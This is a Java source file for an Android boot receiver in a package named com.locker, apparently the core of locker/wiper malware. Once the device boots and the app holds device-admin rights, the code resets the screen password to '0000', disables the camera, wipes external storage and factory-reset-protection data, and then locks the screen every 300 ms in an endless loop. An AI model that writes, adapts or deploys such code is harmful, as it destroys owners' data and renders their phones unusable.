package com.locker;

import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;

public class BootReceiver extends BroadcastReceiver {
    @Override 
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action == null) return;
        
        if (!action.equals(Intent.ACTION_BOOT_COMPLETED) &&
            !action.equals("android.intent.action.QUICKBOOT_POWERON") &&
            !action.equals("com.htc.intent.action.QUICKBOOT_POWERON") &&
            !action.equals(Intent.ACTION_LOCKED_BOOT_COMPLETED)) return;

        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(context, AdminReceiver.class);

        if (dpm.isAdminActive(admin)) {
            dpm.lockNow();
            dpm.resetPassword("0000", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            dpm.setCameraDisabled(admin, true);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE |
                        DevicePolicyManager.WIPE_RESET_PROTECTION_DATA);
            }
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SysBreaker::BootLoopNoRoot");
            wl.acquire();
            new Thread(new Runnable() {
                @Override
                public void run() {
                    while (true) {
                        try {
                            dpm.lockNow();
                            Thread.sleep(300);
                        } catch (Exception ignored) {}
                    }
                }
            }).start();
        } else {
            Intent i = new Intent(context, MainActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
        }
    }
                              }
